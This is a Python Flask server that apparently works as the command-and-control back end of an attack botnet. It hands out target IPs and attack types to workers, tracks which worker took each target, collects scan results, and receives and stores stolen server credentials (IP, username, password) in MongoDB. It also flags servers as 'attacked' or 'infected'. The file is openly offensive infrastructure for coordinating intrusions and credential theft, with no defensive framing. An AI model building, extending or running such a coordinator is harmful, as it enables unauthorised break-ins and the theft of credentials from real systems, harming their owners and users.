from flask import Flask, jsonify, request
from pymongo import MongoClient, ASCENDING
import pymongo
import time

app = Flask(__name__)
mongo_client = MongoClient("mongodb://10.0.0.1:27017/?directConnection=true&authMechanism=DEFAULT")
db = mongo_client["scan"]
ips = db["ips"]
results = db["results"]
targets = db["targets"]
ip_visits_collection = db["ip_visits"]  # New collection for storing IP visits

# New collection for storing found credentials
credentials = db["credentials"]

class Attack:
    def __init__(self, ip, type: int, port: int = None, priority=1):
        self.ip = ip
        self.type = type
        self.port = port
        self.priority = priority

    def __str__(self):
        return self.ip

    def as_dict(self):
        return {"ip": self.ip, "type": self.type, "port": self.port, "priority": self.priority}

    @classmethod
    def from_dict(cls, data):
        return cls(data.get("ip"), data.get("type", 0), data.get("port", None), data.get("priority", 1))

def get_target():
    target_data = targets.find_one_and_update(
        {"gaved": False},
        {"$set": {"gaved": True}},
        sort=[("priority", pymongo.ASCENDING)],
        projection={"ip": True, "type": True, "port": True, "priority": True}
    )
    return Attack.from_dict(target_data) if target_data else None

# in type 2 or 3 attack.
def notify_credentials_found(credentials_data):
    try:
        ip = credentials_data.get("ip")
        username = credentials_data.get("username")
        password = credentials_data.get("password")
        
        # Store the credentials in the database
        credentials.insert_one({"ip": ip, "username": username, "password": password})
        
        print(f"Credentials found: IP - {ip}, Username - {username}, Password - {password}")
        
        # Flag the attacked server
        targets.update_one({"ip": ip}, {"$set": {"attacked": True}})
        
        return jsonify({"status": "success", "message": "Credentials found notification received"})
    except Exception as e:
        print(f"Error notifying credentials found: {str(e)}")
        return jsonify({"status": "error", "message": "Error notifying credentials found"})

@app.route("/notify_credentials_found", methods=["POST"])
def notify_credentials_found_route():
    try:
        data = request.json
        success = notify_credentials_found(data.get("credentials"))
        return success
    except Exception as e:
        return jsonify({"status": "error"})
    
def notify_infected_server(ip_address):
    try:
        print(f"Server at {ip_address} is infected")
        # Implement further actions here, such as storing the information in the database
        return True
    except Exception as e:
        print(f"Error notifying infected server: {str(e)}")
        return False

@app.route("/add_target", methods=["POST"])
def add_target():
    try:
        data = request.json
        attack_instance = Attack.from_dict(data)
        targets.insert_one(attack_instance.as_dict())
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/get_target", methods=["GET"])
def get_target_route():
    target = get_target()

    # Track IP visits
    timestamp = int(time.time())
    if target:
        client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
        ip_visits_collection.insert_one({"client_ip": client_ip, "ip": target.ip, "timestamp": timestamp})

    return jsonify(target.as_dict()) if target else jsonify({"status": "error", "message": "No more targets"})

@app.route("/submit_results", methods=["POST"])
@app.route("/submit_results/", methods=["POST"])
def submit_results():
    data = request.json
    results.insert_one(data)
    return jsonify({"message": "Results received successfully"})

@app.route("/notify_infected_server", methods=["POST"])
def notify_infected_server_route():
    try:
        data = request.json
        success = notify_infected_server(data.get("ip_address"))
        if success:
            return jsonify({"status": "success", "message": "Infected server notification received"})
        else:
            return jsonify({"status": "error", "message": "Error notifying infected server"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == "__main__":
    app.run(debug=True)
